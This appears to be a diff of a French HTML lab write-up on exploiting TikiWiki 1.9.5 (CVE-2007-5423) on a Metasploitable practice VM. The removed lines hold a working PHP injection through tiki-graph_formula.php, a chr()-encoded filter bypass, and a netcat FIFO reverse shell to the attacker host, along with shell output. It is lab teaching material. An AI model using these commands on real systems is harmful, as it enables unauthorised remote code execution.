@@ -40,19 +40,11 @@
   <figure class="capture" id="cap-recon">
     <img src="../images/ms1-tikiwiki/01-recon-nmap.png" alt="Scan nmap du port 80">
     <figcaption>
-      <strong class="idx">1.</strong>
+      <strong class="idx">a.</strong>
       <span class="desc">Résultat de <code>nmap -sC -sV -p 80 192.168.56.102</code> :
       <code>Apache httpd 2.2.8</code> avec <code>PHP/5.2.4</code>.</span>
-      <span class="fname">images/ms1-tikiwiki/01-recon-nmap.png</span>
     </figcaption>
   </figure>
-
-  <pre class="terminal">$ for p in tikiwiki tiki twiki; do curl -s -o /dev/null -w "/$p/ -> %{http_code}\n" "http://192.168.56.102/$p/"; done
-/tikiwiki/ -> 302
-/tiki/ -> 404
-/twiki/ -> 200
-$ curl -s -L http://192.168.56.102/tikiwiki/ | grep -ioE 'TikiWiki [0-9.]+'
-TikiWiki 1.9.5</pre>
 
   <p><code>/tikiwiki/</code> existe (redirection vers <code>tiki-index.php</code>) et tourne en
   version <strong>1.9.5</strong>.</p>
@@ -60,24 +52,15 @@ TikiWiki 1.9.5</pre>
   <figure class="capture" id="cap-version">
     <img src="../images/ms1-tikiwiki/02-enum-version.png" alt="Énumération des répertoires et version de TikiWiki">
     <figcaption>
-      <strong class="idx">2.</strong>
+      <strong class="idx">b.</strong>
       <span class="desc">Énumération des sous-répertoires (<code>/tikiwiki/</code> répond
       <code>302</code>) puis extraction de la version : <strong>TikiWiki 1.9.5</strong>.</span>
-      <span class="fname">images/ms1-tikiwiki/02-enum-version.png</span>
     </figcaption>
   </figure>
 
   <h2 class="section">2. Méthode d'identification de la CVE et du module</h2>
   <p>À partir de la version (TikiWiki 1.9.5), on vérifie l'existence d'une faille connue, du plus
   léger (<code>searchsploit</code>) à la référence précise (<code>info</code> du module) :</p>
-
-  <pre class="terminal">$ searchsploit tikiwiki graph
-TikiWiki 1.9.8 - 'tiki-graph_formula.php' Com...  | php/webapps/4525.pl
-TikiWiki tiki-graph_formula - PHP Remote Code...  | php/webapps/16911.rb
-
-$ msfconsole -q -x "info exploit/unix/webapp/tikiwiki_graph_formula_exec; exit"
-References:
-  https://nvd.nist.gov/vuln/detail/CVE-2007-5423</pre>
 
   <p>La section <code>References</code> confirme <strong>CVE-2007-5423</strong>.</p>
 
@@ -94,11 +77,10 @@ References:
   <figure class="capture" id="cap-cve">
     <img src="../images/ms1-tikiwiki/03-recherche-cve.png" alt="searchsploit et info module donnant la CVE">
     <figcaption>
-      <strong class="idx">3.</strong>
+      <strong class="idx">c.</strong>
       <span class="desc"><code>searchsploit tikiwiki graph</code> confirme l'existence d'un
       exploit public, et <code>info</code> sur le module Metasploit donne
       <strong>CVE-2007-5423</strong>.</span>
-      <span class="fname">images/ms1-tikiwiki/03-recherche-cve.png</span>
     </figcaption>
   </figure>
 
@@ -106,16 +88,12 @@ References:
   <p><strong>a) Confirmer l'exécution PHP.</strong> Test non destructif : si <code>phpinfo()</code>
   injecté dans <code>f[]</code> s'exécute, l'injection PHP est prouvée.</p>
 
-  <pre class="terminal">$ curl -s "http://192.168.56.102/tikiwiki/tiki-graph_formula.php?w=1&h=1&s=1&min=1&max=2&f[]=x.tan.phpinfo()&t=png&title=cmd" | grep -ioE 'PHP Version [0-9.]+'
-PHP Version 5.2.4</pre>
-
   <figure class="capture" id="cap-phpinfo">
     <img src="../images/ms1-tikiwiki/04-confirm-phpinfo.png" alt="phpinfo exécuté via l'injection">
     <figcaption>
-      <strong class="idx">4.</strong>
+      <strong class="idx">d.</strong>
       <span class="desc"><code>f[]=x.tan.phpinfo()</code> renvoie <code>PHP Version 5.2.4</code> :
       le code PHP injecté s'exécute bien côté serveur.</span>
-      <span class="fname">images/ms1-tikiwiki/04-confirm-phpinfo.png</span>
     </figcaption>
   </figure>
 
@@ -138,37 +116,19 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)</pre>
   construit donc la chaîne en <code>chr()</code> (uniquement chiffres, points et parenthèses —
   aucun caractère filtré) :</p>
 
-  <pre class="terminal"># reverse shell FIFO+nc (pas besoin de nc -e ni de /dev/tcp)
-RS='rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.56.1 4444 >/tmp/f'
-CHR=$(python3 -c "import sys;print('.'.join('chr(%d)'%ord(c) for c in sys.argv[1]))" "$RS")
-
-# listener côté Kali, dans un autre terminal : nc -lvnp 4444
-curl -s -G "http://192.168.56.102/tikiwiki/tiki-graph_formula.php?w=1&h=1&s=1&min=1&max=2&t=png&title=cmd" \
-     --data-urlencode "f[]=x.tan.system($CHR)"</pre>
-
   <figure class="capture" id="cap-rce">
     <img src="../images/ms1-tikiwiki/05-rce-bypass.png" alt="Filtre de fonction rejeté puis contourné, RCE www-data">
     <figcaption>
-      <strong class="idx">5.</strong>
+      <strong class="idx">e.</strong>
       <span class="desc"><code>system</code> direct est rejeté
       (<code>Invalid function call system</code>) ; placé après <code>x.tan.</code> il s'exécute et
       renvoie <code>uid=33(www-data)</code> — exécution de commande confirmée.</span>
-      <span class="fname">images/ms1-tikiwiki/05-rce-bypass.png</span>
     </figcaption>
   </figure>
 
   <h2 class="section">4. Preuve d'accès obtenu</h2>
   <p>Le reverse shell se connecte au listener <code>nc</code> et donne une session interactive.
   Les commandes s'exécutent <strong>sur la cible</strong> :</p>
-
-  <pre class="terminal">connect to [192.168.56.1] from (UNKNOWN) [192.168.56.102] 38909
-bash: no job control in this shell
-www-data@metasploitable:/var/www/tikiwiki$ id
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
-www-data@metasploitable:/var/www/tikiwiki$ uname -a
-Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
-www-data@metasploitable:/var/www/tikiwiki$ hostname
-metasploitable</pre>
 
   <p>Shell interactif confirmé en tant que <strong><code>www-data</code></strong> sur
   <code>/var/www/tikiwiki</code>. Ce n'est pas <code>root</code> : l'élévation de privilèges
@@ -177,11 +137,10 @@ metasploitable</pre>
   <figure class="capture" id="cap-preuve">
     <img src="../images/ms1-tikiwiki/06-reverse-shell.png" alt="Reverse shell interactif www-data">
     <figcaption>
-      <strong class="idx">6.</strong>
+      <strong class="idx">f.</strong>
       <span class="desc">Le listener <code>nc</code> reçoit le reverse shell : prompt
       <code>www-data@metasploitable:/var/www/tikiwiki$</code> et <code>id</code> →
       <code>uid=33(www-data)</code> — accès interactif sur la cible.</span>
-      <span class="fname">images/ms1-tikiwiki/06-reverse-shell.png</span>
     </figcaption>
   </figure>
 
